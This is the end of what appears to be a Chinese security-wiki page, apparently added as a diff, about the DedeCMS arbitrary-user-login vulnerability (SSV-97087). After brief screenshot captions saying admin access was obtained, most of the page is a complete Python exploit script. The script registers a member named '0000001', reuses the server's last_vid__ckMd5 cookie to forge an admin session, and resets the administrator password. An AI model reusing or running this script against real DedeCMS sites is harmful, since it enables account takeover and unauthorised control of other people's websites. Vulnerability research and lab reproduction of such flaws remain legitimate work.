+<p><img alt="" src="../resource/%E3%80%90%E5%BC%80%E5%90%AF%E4%BC%9A%E5%91%98%E6%B3%A8%E5%86%8C%E3%80%91%28SSV-97087%29DeDecms%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/media/rId28.png" /></p>
+<p>可以看到已经获取到了，拿去当做DeDeUserID</p>
+<p><img alt="" src="../resource/%E3%80%90%E5%BC%80%E5%90%AF%E4%BC%9A%E5%91%98%E6%B3%A8%E5%86%8C%E3%80%91%28SSV-97087%29DeDecms%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95/media/rId29.png" /></p>
+<p>可以看到，登陆了admin用户。</p>
+<h3 id="python">python脚本<a class="headerlink" href="#python" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><code>  <span class="c1"># coding=utf-8</span>
+
+<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">dede_host</span> <span class="o">=</span> <span class="s2">&quot;http://127.0.0.1/&quot;</span>
+    <span class="n">oldpwd</span> <span class="o">=</span> <span class="s1">&#39;123456&#39;</span>
+    <span class="n">newpwd</span> <span class="o">=</span> <span class="s2">&quot;cnvdcnvd&quot;</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+
+    <span class="k">if</span> <span class="s1">&#39;系统关闭了会员功能&#39;</span> <span class="ow">in</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">dede_host</span> <span class="o">+</span> <span class="s1">&#39;member/reg_new.php&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">content</span><span class="p">:</span>
+        <span class="n">exit</span><span class="p">(</span><span class="s1">&#39;The system has closed the member function .Can not attack !!!&#39;</span><span class="p">)</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nb">print</span> <span class="s2">&quot;The system opened the membership function, I wish you good luck  !!&quot;</span>
+
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;Referer&quot;</span><span class="p">:</span> <span class="n">dede_host</span> <span class="o">+</span> <span class="s2">&quot;member/reg_new.php&quot;</span><span class="p">}</span>
+    <span class="n">rs</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">dede_host</span> <span class="o">+</span> <span class="s1">&#39;include/vdimgck.php&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">content</span>
+    <span class="n">file</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;1.jpg&#39;</span><span class="p">,</span> <span class="s2">&quot;wb&quot;</span><span class="p">)</span>
+    <span class="n">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">rs</span><span class="p">)</span>
+    <span class="n">file</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+    <span class="n">vdcode</span> <span class="o">=</span> <span class="n">raw_input</span><span class="p">(</span><span class="s2">&quot;Please enter the registration verification code : &quot;</span><span class="p">)</span>
+
+    <span class="n">userid</span> <span class="o">=</span> <span class="s1">&#39;0000001&#39;</span>
+    <span class="n">uname</span> <span class="o">=</span> <span class="s1">&#39;0000001&#39;</span>
+    <span class="n">userpwd</span> <span class="o">=</span> <span class="s1">&#39;123456&#39;</span>
+
+
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;User-Agent&quot;</span><span class="p">:</span> <span class="s2">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0)&quot;</span><span class="p">,</span>
+               <span class="s2">&quot;Content-Type&quot;</span><span class="p">:</span> <span class="s2">&quot;application/x-www-form-urlencoded&quot;</span><span class="p">}</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="s2">&quot;dopost=regbase&amp;step=1&amp;mtype=</span><span class="si">%E</span><span class="s2">4%B8%AA</span><span class="si">%E</span><span class="s2">4%BA%BA&amp;mtype=</span><span class="si">%E</span><span class="s2">4%B8%AA</span><span class="si">%E</span><span class="s2">4%BA%BA&amp;userid=</span><span class="si">{userid}</span><span class="s2">&amp;uname=</span><span class="si">{uname}</span><span class="s2">&amp;userpwd=</span><span class="si">{userpwd}</span><span class="s2">&amp;userpwdok=</span><span class="si">{userpwd}</span><span class="s2">&amp;email=0000001%400000001.com&amp;safequestion=0&amp;safeanswer=&amp;sex=</span><span class="si">%E</span><span class="s2">7</span><span class="si">%94%</span><span class="s2">B7&amp;vdcode=</span><span class="si">{vdcode}</span><span class="s2">&amp;agree=&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span>
+        <span class="n">userid</span><span class="o">=</span><span class="n">userid</span><span class="p">,</span> <span class="n">uname</span><span class="o">=</span><span class="n">uname</span><span class="p">,</span> <span class="n">userpwd</span><span class="o">=</span><span class="n">userpwd</span><span class="p">,</span> <span class="n">vdcode</span><span class="o">=</span><span class="n">vdcode</span><span class="p">)</span>
+    <span class="n">rs</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">dede_host</span> <span class="o">+</span> <span class="s1">&#39;/member/reg_new.php&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+    <span class="k">if</span> <span class="s2">&quot;验证码错误&quot;</span> <span class="ow">in</span> <span class="n">rs</span><span class="o">.</span><span class="n">content</span><span class="p">:</span>
+        <span class="n">exit</span><span class="p">(</span><span class="s2">&quot;Verification code error, account registration failed&quot;</span><span class="p">)</span>
+    <span class="k">elif</span> <span class="s1">&#39;注册成功&#39;</span> <span class="ow">in</span> <span class="n">rs</span><span class="o">.</span><span class="n">content</span><span class="p">:</span>
+        <span class="nb">print</span> <span class="s1">&#39;registration success !!&#39;</span>
+
+    <span class="n">rs</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">dede_host</span> <span class="o">+</span> <span class="s2">&quot;/member/index.php?uid=</span><span class="si">{userid}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">userid</span><span class="o">=</span><span class="n">userid</span><span class="p">))</span>
+    <span class="k">if</span> <span class="s2">&quot;资料尚未通过审核&quot;</span> <span class="ow">in</span> <span class="n">rs</span><span class="o">.</span><span class="n">content</span><span class="p">:</span>
+        <span class="n">exit</span><span class="p">(</span><span class="s2">&quot;User information has not been approved !!!&quot;</span><span class="p">)</span>  <span class="c1"># 会员使用权限开通状态(-10 邮件验证 -1 手工审核, 0 没限制)：</span>
+    <span class="n">searchObj</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;last_vid__ckMd5=(.*?);&#39;</span><span class="p">,</span> <span class="n">rs</span><span class="o">.</span><span class="n">headers</span><span class="p">[</span><span class="s1">&#39;Set-Cookie&#39;</span><span class="p">],</span> <span class="n">re</span><span class="o">.</span><span class="n">M</span> <span class="o">|</span> <span class="n">re</span><span class="o">.</span><span class="n">I</span><span class="p">)</span>
+    <span class="n">last_vid__ckMd5</span> <span class="o">=</span> <span class="n">searchObj</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">cookies</span><span class="p">[</span><span class="s1">&#39;DedeUserID&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">userid</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">cookies</span><span class="p">[</span><span class="s1">&#39;DedeUserID__ckMd5&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="n">last_vid__ckMd5</span>
+    <span class="n">rs</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">dede_host</span> <span class="o">+</span> <span class="s2">&quot;/member/index.php&quot;</span><span class="p">)</span>
+    <span class="k">if</span> <span class="s2">&quot;class=</span><span class="se">\&quot;</span><span class="s2">userName</span><span class="se">\&quot;</span><span class="s2">&gt;admin&lt;/a&gt;&quot;</span> <span class="ow">in</span> <span class="n">rs</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+        <span class="nb">print</span> <span class="s2">&quot;Administrator login successful !!&quot;</span>
+
+    <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;Referer&quot;</span><span class="p">:</span> <span class="n">dede_host</span> <span class="o">+</span> <span class="s2">&quot;member/edit_baseinfo.php&quot;</span><span class="p">}</span>
+    <span class="n">rs</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">dede_host</span> <span class="o">+</span> <span class="s1">&#39;include/vdimgck.php&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">content</span>
+    <span class="n">file</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;2.jpg&#39;</span><span class="p">,</span> <span class="s2">&quot;wb&quot;</span><span class="p">)</span>
+    <span class="n">file</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">rs</span><span class="p">)</span>
+    <span class="n">file</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+
+    <span class="n">vdcode</span> <span class="o">=</span> <span class="n">raw_input</span><span class="p">(</span><span class="s2">&quot;Please enter the verification code : &quot;</span><span class="p">)</span>
+
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&quot;dopost&quot;</span><span class="p">:</span> <span class="s2">&quot;save&quot;</span><span class="p">,</span> <span class="s2">&quot;uname&quot;</span><span class="p">:</span> <span class="s2">&quot;admin&quot;</span><span class="p">,</span> <span class="s2">&quot;oldpwd&quot;</span><span class="p">:</span> <span class="n">oldpwd</span><span class="p">,</span> <span class="s2">&quot;userpwd&quot;</span><span class="p">:</span> <span class="n">newpwd</span><span class="p">,</span> <span class="s2">&quot;userpwdok&quot;</span><span class="p">:</span> <span class="n">newpwd</span><span class="p">,</span>
+            <span class="s2">&quot;safequestion&quot;</span><span class="p">:</span> <span class="s2">&quot;0&quot;</span><span class="p">,</span> <span class="s2">&quot;newsafequestion&quot;</span><span class="p">:</span> <span class="s2">&quot;0&quot;</span><span class="p">,</span> <span class="s2">&quot;sex&quot;</span><span class="p">:</span> <span class="s2">&quot;男&quot;</span><span class="p">,</span> <span class="s2">&quot;email&quot;</span><span class="p">:</span> <span class="s2">&quot;admin@admin.com&quot;</span><span class="p">,</span> <span class="s2">&quot;vdcode&quot;</span><span class="p">:</span> <span class="n">vdcode</span><span class="p">}</span>
+    <span class="n">rs</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">dede_host</span> <span class="o">+</span> <span class="s1">&#39;/member/edit_baseinfo.php&#39;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+    <span class="k">if</span> <span class="s2">&quot;成功更新你的基本资料&quot;</span> <span class="ow">in</span>  <span class="n">rs</span><span class="o">.</span><span class="n">content</span><span class="p">:</span>
+       <span class="nb">print</span> <span class="s2">&quot;Administrator password modified successfully !!&quot;</span>
+       <span class="nb">print</span> <span class="s2">&quot;The new administrator password is : &quot;</span> <span class="o">+</span> <span class="n">newpwd</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="nb">print</span> <span class="s2">&quot;attack fail&quot;</span>
+</code></pre></div>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%EF%BC%88CNVD-2018-01221%EF%BC%89DedeCMS%20V5.7%20SP2%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%EF%BC%88CNVD-2018-01221%EF%BC%89DedeCMS%20V5.7%20SP2%E5%AD%98%E5%9C%A8%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        （CNVD-2018-01221）DedeCMS V5.7 SP2存在代码执行漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../%E3%80%90%E5%BC%80%E5%90%AF%E4%BC%9A%E5%91%98%E6%B3%A8%E5%86%8C%E3%80%91%EF%BC%88SSV-97074%EF%BC%89DeDecms%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../%E3%80%90%E5%BC%80%E5%90%AF%E4%BC%9A%E5%91%98%E6%B3%A8%E5%86%8C%E3%80%91%EF%BC%88SSV-97074%EF%BC%89DeDecms%20%E5%89%8D%E5%8F%B0%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E4%BF%AE%E6%94%B9/" class="btn btn-xs btn-link">
+        （SSV-97074）DeDecms 前台任意用户密码修改
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
